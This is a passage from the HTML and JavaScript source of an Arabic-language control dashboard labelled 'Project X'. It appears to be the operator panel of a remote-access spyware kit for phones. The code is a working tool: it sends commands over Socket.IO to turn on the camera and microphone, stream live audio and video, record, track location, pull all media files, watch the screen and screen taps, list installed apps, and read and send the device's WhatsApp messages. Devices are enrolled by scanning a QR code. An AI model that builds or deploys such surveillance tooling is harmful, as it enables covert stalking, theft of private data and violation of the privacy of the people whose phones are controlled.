        .wa-unread { display: inline-flex; align-items: center; justify-content: center; min-width: 20px; height: 20px; border-radius: 999px; background: #25d366; color: #082910; font-size: 0.72rem; font-weight: 700; padding: 0 6px; }
        .wa-chat-panel { border: 1px solid rgba(212, 175, 55, 0.2); border-radius: 10px; background: #0f0404; display: grid; grid-template-rows: auto 1fr auto; overflow: hidden; }
        .wa-chat-header { display: flex; align-items: center; gap: 10px; padding: 10px; border-bottom: 1px solid rgba(212, 175, 55, 0.16); }
        .wa-messages { overflow-y: auto; padding: 12px; background: linear-gradient(180deg, #0c0303, #110505); }
        .wa-msg { max-width: 78%; padding: 9px 11px; border-radius: 10px; margin-bottom: 10px; word-break: break-word; }
        .wa-msg.in { background: #1e0b0b; border: 1px solid rgba(212, 175, 55, 0.22); margin-left: auto; margin-right: 0; }
        .wa-msg.out { background: #16341d; border: 1px solid rgba(54, 173, 96, 0.45); margin-left: 0; margin-right: auto; }
        .wa-msg-time { margin-top: 6px; font-size: 0.72rem; opacity: 0.7; }
        .wa-composer { padding: 10px; border-top: 1px solid rgba(212, 175, 55, 0.16); background: #130707; }
        .wa-textarea { width: 100%; min-height: 74px; border-radius: 8px; background: #1a0909; border: 1px solid rgba(212, 175, 55, 0.2); color: var(--text); padding: 10px; box-sizing: border-box; }
        .wa-actions-row { display: grid; grid-template-columns: 1fr auto; gap: 8px; margin-top: 8px; }
        .wa-keyword-input { background: #1a0909; border: 1px solid rgba(212, 175, 55, 0.2); color: var(--text); border-radius: 8px; padding: 10px; }
        .wa-file-input { background: #1a0909; border: 1px solid rgba(212, 175, 55, 0.2); color: var(--text); border-radius: 8px; padding: 8px; }
        #waSearchInput { margin-bottom: 0; }
        #waFilterType { appearance: none; }
        @keyframes blink { 50% { opacity: 0; } }
        @keyframes tapPing {
            0% { opacity: 1; transform: translate(-50%, -50%) scale(0.4); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(2.2); }
        }
        @media (max-width: 980px) {
            .app-layout { grid-template-columns: 1fr; }
            .sidebar { position: static; }
            .wa-layout { grid-template-columns: 1fr; }
            body { padding: 12px; }
            .header { flex-direction: column; align-items: flex-start; gap: 12px; }
            .header h1 { font-size: 1.5rem; }
            .grid { grid-template-columns: 1fr; }
            .card { padding: 14px; }
            .btn-grid { grid-template-columns: 1fr 1fr; }
            .wa-sidebar-list { max-height: none; }
            .wa-chats-list { max-height: 280px; }
            .wa-chat-panel { min-height: 520px; }
            #cameraFeed { min-height: 190px; }
            #screenShareFeed { min-height: 150px; }
            .log-box, .ai-output { height: 160px; }
        }
        @media (max-width: 620px) {
            body { padding: 8px; }
            .sidebar { padding: 10px; }
            .side-link { padding: 12px 10px; }
            .btn-grid { grid-template-columns: 1fr; }
            .wa-new-chat-row, .wa-actions-row { grid-template-columns: 1fr; }
            .wa-msg { max-width: 92%; }
            .file-grid { grid-template-columns: repeat(auto-fill, minmax(92px, 1fr)); }
            .qr-img { max-width: 120px; }
            .header h1 { font-size: 1.25rem; }
            .card h2 { font-size: 1.05rem; }
            #publicLinkInput { font-size: 0.85rem; }
        }
    </style>
</head>
<body>
    <div class="app-layout">
            <aside class="sidebar">
                <h3><i class="fas fa-bars"></i> التنقل</h3>
                <button class="side-link active" data-target="overview" onclick="switchPage('overview', this)"><i class="fas fa-house"></i> الرئيسية</button>
                <button class="side-link" data-target="camera" onclick="switchPage('camera', this)"><i class="fas fa-camera"></i> الكاميرا والتحكم</button>
                <button class="side-link" data-target="location" onclick="switchPage('location', this)"><i class="fas fa-map-marker-alt"></i> الموقع</button>
                <button class="side-link" data-target="media" onclick="switchPage('media', this)"><i class="fas fa-photo-film"></i> سحب الوسائط</button>
                <button class="side-link" data-target="whatsapp" onclick="switchPage('whatsapp', this)"><i class="fab fa-whatsapp"></i> واتساب</button>
                <button class="side-link" data-target="tools" onclick="switchPage('tools', this)"><i class="fas fa-toolbox"></i> باقي الوظائف</button>
            </aside>

            <main class="content-area">
                <div class="header">
                    <h1>المشروع X <small style="font-size: 0.5em; color: #666;">v2.3</small></h1>
                    <div>
                        <span id="connectionStatus" style="color: #666;">جاري الاتصال...</span>
                        <button class="btn btn-danger" onclick="logout()" style="margin-right: 10px;">خروج</button>
                    </div>
                </div>

                <div class="grid">
                    <!-- قائمة الأجهزة -->
                    <div class="card page-card active" data-page="overview">
                        <h2><i class="fas fa-mobile-alt"></i> الأجهزة المتصلة</h2>
                        <div id="deviceList">
                            <p style="text-align: center; color: #666;">لا توجد أجهزة متصلة</p>
                        </div>
                        <button class="btn" onclick="refreshDevices()" style="width: 100%; margin-top: 10px;">تحديث القائمة</button>
                    </div>

                    <!-- التحكم -->
                    <div class="card page-card" data-page="camera">
                        <h2><i class="fas fa-gamepad"></i> التحكم المباشر</h2>
                        <div id="selectedDeviceInfo" style="margin-bottom: 10px; color: #aaa;">لم يتم اختيار جهاز</div>
                    
                        <div id="feedWrapper">
                            <img id="cameraFeed" src="" alt="بث الكاميرا">
                            <div id="tapOverlay"></div>
                            <div id="videoRecIndicator" class="rec-indicator">🔴 جاري تسجيل الفيديو</div>
                        </div>
                    
                        <div style="margin-top: 15px;">
                            <div class="control-group">
                                <h3>📷 التحكم بالكاميرا</h3>
                                <div class="btn-grid">
                                    <button class="btn" onclick="sendCommand('camera_on')"><i class="fas fa-play"></i> تشغيل</button>
                                    <button class="btn btn-danger" onclick="sendCommand('camera_off')"><i class="fas fa-stop"></i> إيقاف</button>
                                    <button class="btn" onclick="sendCommand('camera_back')"><i class="fas fa-camera"></i> خلفية</button>
                                    <button class="btn" onclick="sendCommand('camera_front')"><i class="fas fa-user"></i> أمامية</button>
                                    <button class="btn" onclick="sendCommand('capture_photo')"><i class="fas fa-camera-retro"></i> التقاط صورة</button>
                                    <button class="btn" style="background: linear-gradient(180deg, #8f1111, #5f0b0b); color: #f7edd6; border: 1px solid rgba(212, 175, 55, 0.32);" onclick="sendCommand('burst_capture')"><i class="fas fa-images"></i> تصوير متتابع</button>
                                </div>
                            </div>

                            <div class="control-group">
                                <h3>🎤 الصوت والتسجيل</h3>
                                <div class="btn-grid">
                                    <button class="btn" onclick="enableAudioContext()" style="border-color: var(--primary); color: var(--primary-soft);"><i class="fas fa-volume-up"></i> تفعيل الصوت</button>
                                    <button class="btn" onclick="sendCommand('mic_on')"><i class="fas fa-headphones"></i> استماع مباشر</button>
                                    <button class="btn btn-danger" onclick="sendCommand('mic_off')"><i class="fas fa-microphone-slash"></i> إيقاف الاستماع</button>
                                    <button class="btn" style="background: linear-gradient(180deg, #6c1b1b, #431010); color: #f7edd6; border: 1px solid rgba(212, 175, 55, 0.32);" onclick="sendCommand('start_audio_recording')"><i class="fas fa-file-audio"></i> تسجيل صوتي</button>
                                    <button class="btn" style="background: linear-gradient(180deg, #e0b94d, #9a6e1a); color: #230808; border: 1px solid rgba(255, 220, 130, 0.4);" onclick="sendCommand('start_recording')"><i class="fas fa-video"></i> تسجيل فيديو</button>
                                    <button class="btn btn-danger" onclick="sendCommand('stop_recording')"><i class="fas fa-stop-circle"></i> إيقاف التسجيل</button>
                                </div>
                            </div>

                            <div class="control-group">
                                <h3>⚡ أدوات النظام (Hardware)</h3>
                                <div class="btn-grid">
                                    <button class="btn" style="background: linear-gradient(180deg, #f0c455, #aa7a17); color: #230808; border: 1px solid rgba(255, 220, 130, 0.4);" onclick="sendCommand('torch_on')"><i class="fas fa-lightbulb"></i> تشغيل الفلاش</button>
                                    <button class="btn" style="background: linear-gradient(180deg, #241010, #120505); color: #f5df9c; border: 1px solid rgba(212, 175, 55, 0.25);" onclick="sendCommand('torch_off')"><i class="fas fa-lightbulb"></i> إيقاف الفلاش</button>
                                    <button class="btn" style="background: linear-gradient(180deg, #8c1010, #5a0909); color: #f7edd6; border: 1px solid rgba(212, 175, 55, 0.25);" onclick="sendCommand('vibrate')"><i class="fas fa-vibrate"></i> اهتزاز قوي</button>
                                    <button class="btn" style="background: linear-gradient(180deg, #684116, #43250d); color: #f5df9c; border: 1px solid rgba(212, 175, 55, 0.28);" onclick="const t=prompt('اكتب النص للنطق:'); if(t) sendCommand('tts_speak', {text: t})"><i class="fas fa-comment-dots"></i> نطق رسالة</button>
                                    <button class="btn btn-danger" onclick="sendCommand('play_alarm')"><i class="fas fa-bullhorn"></i> تشغيل إنذار</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="card page-card" data-page="location">
                        <h2><i class="fas fa-map-marker-alt"></i> صفحة الموقع</h2>
                        <div id="selectedLocationInfo" style="margin-bottom: 10px; color: #aaa;">اختر جهاز من الصفحة الرئيسية</div>
                        <div class="btn-grid">
                            <button class="btn" onclick="sendCommand('location')"><i class="fas fa-location-arrow"></i> إرسال الموقع الآن</button>
                            <button class="btn btn-danger" onclick="sendCommand('stop_location')"><i class="fas fa-location-slash"></i> إيقاف تتبع الموقع</button>
                        </div>
                        <div style="margin-top:12px; color: var(--muted); font-size: 0.9rem;">
                            آخر موقع يظهر داخل بطاقة معلومات الجهاز عند اختياره، ويمكن فتح الرابط مباشرة من هناك.
                        </div>
                    </div>

                    <div class="card page-card" data-page="media">
                        <h2><i class="fas fa-cloud-download-alt"></i> سحب الصور والفيديوهات</h2>
                        <div class="btn-grid">
                            <button class="btn" style="background: linear-gradient(180deg, #5d3110, #3a1a08); color: #f5df9c; border: 1px solid rgba(212, 175, 55, 0.3);" onclick="sendCommand('request_file_images')"><i class="fas fa-images"></i> سحب صور</button>
                            <button class="btn" style="background: linear-gradient(180deg, #5d3110, #3a1a08); color: #f5df9c; border: 1px solid rgba(212, 175, 55, 0.3);" onclick="sendCommand('request_file_videos')"><i class="fas fa-film"></i> سحب فيديو</button>
                            <button class="btn" style="background: linear-gradient(180deg, #6d4516, #41230b); color: #f5df9c; border: 1px solid rgba(212, 175, 55, 0.3);" onclick="sendCommand('request_file_all')"><i class="fas fa-folder-plus"></i> سحب كل الملفات</button>
                        </div>
                    </div>

                    <!-- المعلومات والربط -->
                    <div class="card page-card" data-page="overview">
                        <h2><i class="fas fa-link"></i> ربط جهاز جديد</h2>
                        <div style="text-align: center;">
                            <img src="/api/qr" class="qr-img" alt="QR Code">
                            <p>امسح الكود لربط الهاتف</p>
                            <p style="font-size: 0.8rem; color: var(--muted);">IP: <span id="serverIp">...</span></p>
                            <div id="publicLinkArea" style="margin-top: 10px; font-size: 0.8rem; color: var(--primary-soft); word-break: break-all;"></div>
                        </div>
                        <hr style="border-color: var(--line-soft);">
                        <h3>سجل العمليات</h3>
                        <div class="log-box" id="systemLog"></div>
                    </div>

                    <div class="card page-card" data-page="tools">
                        <h2><i class="fas fa-robot"></i> مساعد AI</h2>
                        <textarea id="aiPrompt" class="ai-input" placeholder="اكتب سؤالك هنا..."></textarea>
                        <button id="aiAskBtn" class="btn" style="margin-top: 10px; width: 100%;" onclick="askAiAssistant()">
                            <i class="fas fa-paper-plane"></i> اسأل المساعد
                        </button>
                        <div id="aiOutput" class="ai-output">
                            <div style="color:#777;">جاهز. اكتب سؤالك واضغط اسأل المساعد.</div>
                        </div>
                        <div id="screenSharePanel" class="screen-panel">
                            <div class="screen-panel-title"><i class="fas fa-mobile-alt"></i> شاشة الهاتف (مشاركة الشاشة)</div>
                            <img id="screenShareFeed" src="" alt="مشاركة شاشة الهاتف">
                        </div>
                        <button class="btn" style="margin-top: 12px; width: 100%; background: linear-gradient(180deg, #7a1515, #4e0909); color: #f7edd6; border: 1px solid rgba(212, 175, 55, 0.3);" onclick="sendCommand('get_apps')"><i class="fas fa-th-large"></i> جلب التطبيقات من الهاتف</button>
                    </div>

                    <div class="card page-card" data-page="whatsapp">
                        <h2><i class="fab fa-whatsapp"></i> واتساب (محادثات مباشرة)</h2>
                        <div class="wa-layout">
                            <div class="wa-sidebar-list">
                                <div class="wa-new-chat-row">
                                    <input id="waPhone" class="wa-phone-input" placeholder="رقم جديد: 201234567890">
                                    <button class="btn" onclick="openPhoneChat()"><i class="fas fa-plus"></i></button>
                                </div>
                                <input id="waSearchInput" class="wa-phone-input" placeholder="بحث في المحادثات/الرسائل..." oninput="onWaSearchChanged(this.value)">
                                <select id="waFilterType" class="wa-phone-input" style="margin-top:8px;" onchange="onWaFilterChanged(this.value)">
                                    <option value="all">كل الرسائل</option>
                                    <option value="text">نص</option>
                                    <option value="image">صور</option>
                                    <option value="video">فيديو</option>
                                    <option value="audio">صوت</option>
                                    <option value="file">ملفات/PDF</option>
                                </select>
                                <button class="btn" style="margin-top:8px;" onclick="forceSyncWhatsApp()"><i class="fas fa-rotate"></i> مزامنة مع واتساب الرسمي</button>
                                <div id="waSyncNote" style="margin-top:8px; font-size:0.78rem; color:var(--muted);">سيتم جلب الرسائل والصور من المزود عند التوفر.</div>
                                <div id="waChatsList" class="wa-chats-list"></div>
                            </div>

                            <div class="wa-chat-panel">
                                <div class="wa-chat-header">
                                    <img id="waActiveAvatar" class="wa-avatar" src="" alt="avatar">
                                    <div>
                                        <div id="waActiveName" style="font-weight:700; color: var(--primary-soft);">اختر محادثة</div>
                                        <div id="waActiveSub" style="font-size:0.8rem; color: var(--muted);"></div>
                                    </div>
                                </div>

                                <div id="waMessages" class="wa-messages">
                                    <div style="color:#888; text-align:center; padding: 20px;">اختر رقمًا من القائمة أو أدخل رقمًا جديدًا</div>
                                </div>

                                <div class="wa-composer">
                                    <textarea id="waMessage" class="wa-textarea" placeholder="اكتب رسالة..."></textarea>
                                    <div class="wa-actions-row">
                                        <input id="waKeyword" class="wa-keyword-input" placeholder="كلمة تفعيل الرد التلقائي (اختياري)">
                                        <button id="waSendBtn" class="btn" onclick="sendWhatsAppMessage()"><i class="fab fa-whatsapp"></i> إرسال</button>
                                    </div>
                                    <div class="wa-actions-row">
                                        <input id="waFileInput" type="file" class="wa-file-input">
                                        <input id="waFileCaption" class="wa-keyword-input" placeholder="تعليق الملف (اختياري)">
                                        <button id="waSendFileBtn" class="btn" onclick="sendWhatsAppFile()"><i class="fas fa-paperclip"></i> إرسال ملف</button>
                                    </div>
                                    <div class="wa-actions-row" style="grid-template-columns: 1fr auto;">
                                        <div id="waVoiceStatus" style="color:var(--muted); padding:8px; border:1px dashed rgba(212,175,55,.25); border-radius:8px;">Voice Note جاهز</div>
                                        <button id="waVoiceBtn" class="btn" onclick="toggleWaVoiceRecording()"><i class="fas fa-microphone"></i> تسجيل Voice</button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div id="waStatus" class="ai-output" style="height: 110px; margin-top: 10px;">
                            <div style="color:#777;">تحديث لحظي للرسائل الواردة من الويبهوك. سترى الردود هنا مباشرة.</div>
                        </div>
                    </div>

                    <!-- قسم الملفات المحفوظة -->
                    <div class="card page-card" data-page="media" style="grid-column: 1 / -1;">
                        <h2><i class="fas fa-folder-open"></i> الملفات المحفوظة</h2>
                        <div id="fileBrowser" class="file-grid" style="max-height: 500px; overflow-y: auto;">
                            <!-- الملفات ستظهر هنا -->
                        </div>
                        <button class="btn" onclick="loadFiles()" style="width: 100%; margin-top: 10px;">
                            <i class="fas fa-sync-alt"></i> تحديث الملفات
                        </button>
                    </div>
                </div>
            </main>
        </div>
    <script>
        let socket;
        let selectedDeviceId = null;
        let userId = null;

        // تحديث QR Code ليشمل التوكن الحالي
        document.querySelector('.qr-img').src = `/api/qr`;

        // متغير لتخزين بيانات الأجهزة محلياً
        window.currentDevices = [];
        let lastTapLogAt = 0;
        let waChats = [];
        let waActiveChatId = '';
        let waSearchTerm = '';
        let waFilterType = 'all';
        let waCurrentMessages = [];
        let waVoiceRecorder = null;
        let waVoiceChunks = [];
        let waVoiceStream = null;

        function switchPage(pageName, btn) {
            document.querySelectorAll('.page-card').forEach(card => {
                card.classList.toggle('active', card.dataset.page === pageName);
            });

            document.querySelectorAll('.side-link').forEach(link => {
                link.classList.remove('active');
            });

            if (btn) {
                btn.classList.add('active');
            } else {
                const matched = document.querySelector(`.side-link[data-target="${pageName}"]`);
                if (matched) matched.classList.add('active');
            }

            if (pageName === 'whatsapp') {
                loadWhatsAppChats(true);
            }
        }

        function initSocket() {
            if (typeof io === 'undefined') {
                document.getElementById('connectionStatus').innerHTML = '<span style="color:red">❌ خطأ: المكتبة مفقودة</span>';
                console.error("Socket.IO library not loaded!");
                return;
            }

            socket = io({
                auth: {
                    client_type: 'dashboard',
                    user_id: userId
                },
                transports: ["websocket", "polling"],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 1000,
                timeout: 20000
            });

            socket.on('connect', () => {
                document.getElementById('connectionStatus').textContent = '🟢 متصل بالخادم';
                document.getElementById('connectionStatus').style.color = '#0f0';
                log('تم الاتصال بالخادم بنجاح');
                refreshDevices();
            });

            socket.on('disconnect', () => {
                document.getElementById('connectionStatus').textContent = '🔴 غير متصل';
                document.getElementById('connectionStatus').style.color = '#f44336';
                log('انقطع الاتصال بالخادم');
            });
            
            socket.on('connect_error', (err) => {
                document.getElementById('connectionStatus').textContent = '⚠️ خطأ في الاتصال';
                document.getElementById('connectionStatus').style.color = 'orange';
                console.error('Socket Error:', err);
            });

            socket.on('device_registered', (data) => {
                log(`جهاز جديد اتصل: ${data.name}`);
                refreshDevices();
            });

            socket.on('device_disconnected', (data) => {
                log(`جهاز انفصل: ${data.device_id}`);
                refreshDevices();
            });

            socket.on('camera_frame', (data) => {
                if (selectedDeviceId && data.device_id === selectedDeviceId) {
                    const source = data.source || 'camera';
                    if (source === 'screen') {
                        const panel = document.getElementById('screenSharePanel');
                        const feed = document.getElementById('screenShareFeed');
                        if (feed) feed.src = 'data:image/jpeg;base64,' + data.frame;
                        if (panel) panel.style.display = 'block';
                        const indicator = document.getElementById('videoRecIndicator');
                        indicator.textContent = '🖥️ مشاركة الشاشة';
                        indicator.style.display = 'block';
                    } else {
                        document.getElementById('cameraFeed').src = 'data:image/jpeg;base64,' + data.frame;
                    }
                }
            });

            socket.on('screen_tap', (data) => {
                if (selectedDeviceId && data.device_id === selectedDeviceId) {
                    showTapMarker(data.x, data.y);
                    const now = Date.now();
                    if (now - lastTapLogAt > 900) {
                        const px = Math.round((Number(data.x) || 0) * 100);
                        const py = Math.round((Number(data.y) || 0) * 100);
                        log(`👆 نقرة شاشة عند (${px}%, ${py}%)`);
                        lastTapLogAt = now;
                    }
                }
            });

            let audioQueue = [];
            let isPlayingAudio = false;
            let audioUnlocked = false;
            let audioUnlockAttempted = false;

            async function unlockDashboardAudio(silent = false) {
                if (audioUnlocked) return true;
                try {
                    const AC = window.AudioContext || window.webkitAudioContext;
                    if (AC) {
                        const ctx = new AC();
                        if (ctx.state === 'suspended') {
                            await ctx.resume();
                        }
                        const osc = ctx.createOscillator();
                        const gain = ctx.createGain();
                        gain.gain.value = 0.00001;
                        osc.frequency.value = 220;
                        osc.connect(gain);
                        gain.connect(ctx.destination);
                        osc.start();
                        osc.stop(ctx.currentTime + 0.02);
                    }

                    const probe = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAESsAACJWAAACABAAZGF0YQAAAAA=');
                    probe.volume = 0.001;
                    await probe.play();
                    probe.pause();

                    audioUnlocked = true;
                    if (!silent) log('🔊 Live audio enabled');
                    return true;
                } catch (e) {
                    if (!silent) log('⚠️ Click once more to enable audio playback');
                    return false;
                }
            }

            // دالة لتفعيل الصوت يدوياً (لحل مشكلة حجب المتصفح)
            window.enableAudioContext = function() {
                audioUnlockAttempted = true;
                unlockDashboardAudio(false);
            };

            document.addEventListener('pointerdown', () => {
                if (!audioUnlockAttempted) {
                    audioUnlockAttempted = true;
                    unlockDashboardAudio(true);
                }
            }, { once: true, passive: true });

            async function playNextAudio() {
                if (audioQueue.length === 0) { isPlayingAudio = false; return; }
                if (!audioUnlocked) {
                    const unlocked = await unlockDashboardAudio(true);
                    if (!unlocked) {
                        isPlayingAudio = false;
                        return;
                    }
                }
                if (audioQueue.length > 8) {
                    // إبقاء آخر الحزم فقط لمنع التأخير التراكمي
                    audioQueue = audioQueue.slice(-3);
                }
                isPlayingAudio = true;
                const item = audioQueue.shift();
                
                // تعديل: دعم Base64 لتجنب مشاكل Polling
                let url;
                if (typeof item.chunk === 'string') {
                    url = item.chunk;
                } else {
                    const blob = new Blob([item.chunk], { type: item.mimeType || 'audio/webm' });
                    url = URL.createObjectURL(blob);
                }
                
                const audio = new Audio(url);
                audio.preload = 'auto';
                audio.playsInline = true;
                audio.volume = 1.0;

                let watchdog = null;
                
                audio.onended = () => { 
                    if (watchdog) clearTimeout(watchdog);
                    if (typeof item.chunk !== 'string') URL.revokeObjectURL(url); 
                    playNextAudio(); 
                };
                audio.onerror = () => {
                    if (watchdog) clearTimeout(watchdog);
                    if (typeof item.chunk !== 'string') URL.revokeObjectURL(url);
                    playNextAudio();
                };
                // محاولة التشغيل والتعامل مع الأخطاء
                try {
                    await audio.play();
                    watchdog = setTimeout(() => {
                        if (!audio.paused) {
                            audio.pause();
                        }
                        if (typeof item.chunk !== 'string') URL.revokeObjectURL(url);
                        playNextAudio();
                    }, 5000);
                } catch(e) {
                    console.log('Audio error', e);
                    if (typeof item.chunk !== 'string') URL.revokeObjectURL(url);
                    playNextAudio();
                }
            }

            socket.on('audio_chunk', (data) => {
                if (selectedDeviceId && data.device_id === selectedDeviceId) {
                    if (!data || !data.chunk) return;
                    // تخزين البيانات الخام وتشغيلها بالتتابع
                    audioQueue.push(data);
                    if (audioQueue.length > 10) {
                        audioQueue = audioQueue.slice(-4);
                    }
                    if (!isPlayingAudio) playNextAudio();
                }
            });
            
            socket.on('command_response', (data) => {
                if (selectedDeviceId && data.device_id === selectedDeviceId) {
                    const indicator = document.getElementById('videoRecIndicator');
                    const panel = document.getElementById('screenSharePanel');
                    const feed = document.getElementById('screenShareFeed');
                    if (data.message === 'Screen share started') {
                        indicator.textContent = '🖥️ مشاركة الشاشة';
                        indicator.style.display = 'block';
                        if (panel) panel.style.display = 'block';
                    } else if (data.message === 'Screen share stopped') {
                        indicator.style.display = 'none';
                        indicator.textContent = '🔴 جاري تسجيل الفيديو';
                        if (panel) panel.style.display = 'none';
                        if (feed) feed.src = '';
                    } else if ((data.message || '').startsWith('Permission denied')) {
                        if (panel) panel.style.display = 'none';
                        if (feed) feed.src = '';
                    }
                }

                // تجاهل الردود الصامتة لتجنب تكرار السجلات
                if (data.message !== 'Location sent') {
                    const icon = data.status === 'success' ? '✅' : '❌';
                    log(` رد الجهاز: ${data.message || data.status}`);
                }
            });
            
            socket.on('error', (data) => {
                log(`خطأ: ${data.message}`);
                if(data.code === 'auth_failed') logout();
            });

            socket.on('download_ready', (data) => {
                log('📥 جاري تحميل الملف: ' + data.filename);
                const link = document.createElement('a');
                link.href = '/uploads/' + data.filename;
                link.download = data.filename;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                loadFiles();
            });

            socket.on('location_received', (data) => {
                log(`📍 الموقع: <a href="${data.link}" target="_blank" style="color: #0f0;">${data.link}</a>`);
                // تحديث المعلومات إذا كان هذا هو الجهاز المختار
                if (selectedDeviceId === data.device_id) {
                    // إعادة تحميل البيانات لتحديث الرابط
                    refreshDevices().then(() => {
                        const dev = window.currentDevices.find(d => d.id === selectedDeviceId);
                        if(dev) selectDevice(dev.id);
                    });
                }
            });

            socket.on('apps_received', (data) => {
                const modal = document.getElementById('appsModal');
                const list = document.getElementById('appsList');
                list.innerHTML = '';
                
                data.apps.forEach(app => {
                    const div = document.createElement('div');
                    div.style.cssText = 'background:#333; padding:10px; border-radius:5px; display:flex; justify-content:flex-start; align-items:center; border-bottom: 1px solid #444;';
                    div.innerHTML = `
                        <div style="display:flex; align-items:center; gap:10px;">
                            <i class="fab fa-${app.icon} fa-lg" style="color:${app.color}; width: 25px;"></i>
                            <span style="font-weight: bold;">${app.name}</span>
                        </div>
                    `;
                    list.appendChild(div);
                });
                
                modal.style.display = 'flex';
            });

            socket.on('whatsapp_event', (data) => {
                if (!data || data.type !== 'message') return;
                const incomingChatId = (data.chat_id || '').toLowerCase();
                if (!incomingChatId) return;

                loadWhatsAppChats(true);
                if (waActiveChatId && waActiveChatId === incomingChatId) {
                    const msg = data.message || {};
                    appendWaMessageBubble(msg, true);
                }
            });
        }

        let isRefreshing = false;
        function refreshDevices() {
            if (isRefreshing) return;
            isRefreshing = true;

            return fetch('/api/devices')
            .then(r => r.json())
            .then(data => {
                const list = document.getElementById('deviceList');
                list.innerHTML = '';
                if (data.devices.length === 0) {
                    list.innerHTML = '<p style="text-align: center; color: #666;">لا توجد أجهزة متصلة</p>';
                    return;
                }
                
                window.currentDevices = data.devices;
                data.devices.forEach(device => {
                    const div = document.createElement('div');
                    div.className = `device-item ${selectedDeviceId === device.id ? 'selected' : ''}`;
                    div.dataset.deviceId = device.id;
                    div.onclick = () => selectDevice(device.id);
                    const shortName = device.raw_name || device.name || 'Unknown Device';
                    const fullName = device.name || shortName;
                    div.innerHTML = `
                        <div>
                            <strong>${shortName}</strong><br>
                            <small style="color: #c3a56d;">🧩 ${device.platform || 'Unknown OS'}</small><br>
                            <small style="color: #aaa;">🏷️ ${fullName}</small><br>
                            <span style="font-size: 0.8em; color: #aaa;">🔋 ${device.battery || '?'}</span>
                            <small style="color: #aaa;">${device.ip}</small>
                        </div>
                        <div>
                            <span class="status-dot ${device.online ? 'online' : 'offline'}"></span>
                        </div>
                    `;
                    list.appendChild(div);
                });
                
                // اختيار تلقائي لأول جهاز إذا لم يتم اختيار جهاز
                if (!selectedDeviceId && data.devices.length > 0) {
                    selectDevice(data.devices[0].id);
                }
            })
            .finally(() => { isRefreshing = false; });
        }

        function selectDevice(id) {
            selectedDeviceId = id;
            const indicator = document.getElementById('videoRecIndicator');
            const cameraFeed = document.getElementById('cameraFeed');
            const screenPanel = document.getElementById('screenSharePanel');
            const screenFeed = document.getElementById('screenShareFeed');
            if (indicator) {
                indicator.style.display = 'none';
                indicator.textContent = '🔴 جاري تسجيل الفيديو';
            }
            if (cameraFeed) cameraFeed.src = '';
            if (screenPanel) screenPanel.style.display = 'none';
            if (screenFeed) screenFeed.src = '';
            
            // تحديث قسم معلومات الجهاز
            const device = window.currentDevices.find(d => d.id === id);
            const displayName = (device && device.name) ? device.name : 'Unknown Device';
            const rawName = (device && device.raw_name) ? device.raw_name : displayName;
            const platform = (device && device.platform) ? device.platform : 'Unknown OS';
            const battery = device && device.battery ? device.battery : 'غير معروف';
            const locLink = device && device.location ? `<a href="${device.location}" target="_blank" style="color: var(--primary-soft); text-decoration: none;">📍 فتح الموقع (Live)</a>` : 'غير متوفر';
            const infoCardHtml = `
                <div style="background: linear-gradient(180deg, #1d0a0a, #120505); padding: 15px; border-radius: 5px; border: 1px solid rgba(212, 175, 55, 0.16); margin-bottom: 15px;">
                    <h3 style="margin: 0 0 10px 0; color: var(--primary-soft); border-bottom: 1px solid rgba(212, 175, 55, 0.16); padding-bottom: 5px;">📱 معلومات الجهاز</h3>
                    <p style="margin: 5px 0;"><strong>الموديل:</strong> ${rawName}</p>
                    <p style="margin: 5px 0;"><strong>الاسم الكامل:</strong> ${displayName}</p>
                    <p style="margin: 5px 0;"><strong>النظام:</strong> ${platform}</p>
                    <p style="margin: 5px 0;"><strong>🔋 البطارية:</strong> ${battery}</p>
                    <p style="margin: 5px 0;"><strong>🌍 الموقع:</strong> ${locLink}</p>
                </div>
            `;
            
            const selectedInfo = document.getElementById('selectedDeviceInfo');
            if (selectedInfo) selectedInfo.innerHTML = infoCardHtml;
            const locationInfo = document.getElementById('selectedLocationInfo');
            if (locationInfo) locationInfo.innerHTML = infoCardHtml;
            
            // تحديث التظليل في القائمة
            const items = document.querySelectorAll('.device-item');
            items.forEach(item => {
                if (item.dataset.deviceId === id) item.classList.add('selected');
                else item.classList.remove('selected');
            });
        }

        function sendCommand(cmd, extraData = {}) {
            if (!selectedDeviceId) {
                alert('الرجاء اختيار جهاز أولاً');
                return;
            }
            
            log(`إرسال أمر: ...`);
            socket.emit('send_command', {
                device_id: selectedDeviceId,
                command: cmd,
                ...extraData
            });

            if (cmd === 'screen_share_start') {
                log('🖥️ تم إرسال طلب مشاركة الشاشة. الهاتف يحتاج موافقة المستخدم.');
            }

            const indicator = document.getElementById('videoRecIndicator');
            if (cmd === 'start_recording') {
                indicator.textContent = '🔴 جاري تسجيل الفيديو';
                indicator.style.display = 'block';
            } else if (cmd === 'stop_recording') {
                indicator.style.display = 'none';
            } else if (cmd === 'screen_share_start' || cmd === 'screen_record_start') {
                indicator.textContent = '🖥️ مشاركة الشاشة';
                indicator.style.display = 'block';
            } else if (cmd === 'screen_share_stop' || cmd === 'screen_record_stop') {
                indicator.style.display = 'none';
                indicator.textContent = '🔴 جاري تسجيل الفيديو';
                const panel = document.getElementById('screenSharePanel');
                const feed = document.getElementById('screenShareFeed');
                if (panel) panel.style.display = 'none';
                if (feed) feed.src = '';
            }
        }

        function log(msg) {
            const box = document.getElementById('systemLog');
            const now = new Date();
            const time = now.toLocaleTimeString();
            box.innerHTML = `<div class="log-entry"><span style="color: var(--primary-soft)">[${time}]</span> ${msg}</div>` + box.innerHTML;
        }

        function showTapMarker(normX, normY) {
            const overlay = document.getElementById('tapOverlay');
            if (!overlay) return;

            const x = Math.max(0, Math.min(1, Number(normX) || 0));
            const y = Math.max(0, Math.min(1, Number(normY) || 0));

            const marker = document.createElement('div');
            marker.className = 'tap-marker';
            marker.style.left = (x * 100) + '%';
            marker.style.top = (y * 100) + '%';

            overlay.appendChild(marker);
            setTimeout(() => marker.remove(), 750);
        }

        function escapeHtml(value) {
            const div = document.createElement('div');
            div.textContent = value;
            return div.innerHTML;
        }

        async function askAiAssistant() {
            const input = document.getElementById('aiPrompt');
            const output = document.getElementById('aiOutput');
            const btn = document.getElementById('aiAskBtn');

            const message = (input.value || '').trim();
            if (!message) {
                alert('اكتب سؤالك أولاً');
                return;
            }

            const context = selectedDeviceId
